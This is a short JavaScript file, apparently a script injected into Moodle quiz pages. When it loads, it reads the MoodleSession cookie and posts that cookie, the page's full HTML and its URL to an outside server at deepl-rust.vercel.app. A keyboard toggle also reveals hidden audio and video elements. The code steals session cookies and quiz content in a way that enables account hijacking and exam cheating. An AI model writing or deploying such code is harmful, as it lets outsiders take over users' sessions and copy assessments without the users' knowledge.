let display = false;

function keydown(evt){
  if (!evt) evt = event;
  if ((evt.metaKey && evt.keyCode == 88) || (evt.keyCode == 17 && evt.keyCode == 88)){ //CTRL+ALT+F4
    display = !display;
    if (display) {
      document.querySelector("audio").controls = true; 
      document.querySelector("audio").style.display = "block";
      document.querySelector(".video-js").style.display = "block";
      document.querySelector(".video-js").style.background = "none";
    } else {
      document.querySelector("audio").style.display = "none";
      document.querySelector(".video-js").style.display = "none";
    }
  }
}

document.onkeydown = keydown;

function sendDataToServer()
{
  var req = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
  
  req.open("POST", "https://deepl-rust.vercel.app/saveQuestion", false);

  let body = {
    html : document.body.innerHTML,
    url : window.location.href,
    cookie : getMoodleSessionCookie()
  };
  req.setRequestHeader("Access-Control-Allow-Origin", "*");

  req.send(JSON.stringify(body));
}

function getMoodleSessionCookie() {
  let cookie = getCookie("MoodleSession");
  return "MoodleSession=" + cookie;
}

function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

sendDataToServer();